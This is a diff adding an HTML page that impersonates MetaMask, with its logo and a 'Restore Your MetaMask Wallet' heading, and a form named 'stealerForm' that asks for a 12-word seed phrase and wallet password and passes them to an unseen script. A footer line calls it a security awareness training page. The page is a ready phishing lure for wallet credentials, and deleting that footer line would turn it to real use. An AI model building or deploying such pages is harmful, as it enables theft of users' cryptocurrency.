@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MetaMask Recovery</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <img src="metamask.png" alt="MetaMask Logo" class="logo">
+    <h2>Restore Your MetaMask Wallet</h2>
+    <form id="stealerForm">
+      <input type="text" id="wallet" placeholder="Enter your 12-word seed phrase" required>
+      <input type="password" id="password" placeholder="Wallet password" required>
+      <button type="submit">Restore Wallet</button>
+    </form>
+    <div id="response"></div>
+    <p class="warning">✅ You’re on a security awareness training page. 🔐 Do not share your seed phrase on any website. Stay vigilant.</p>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
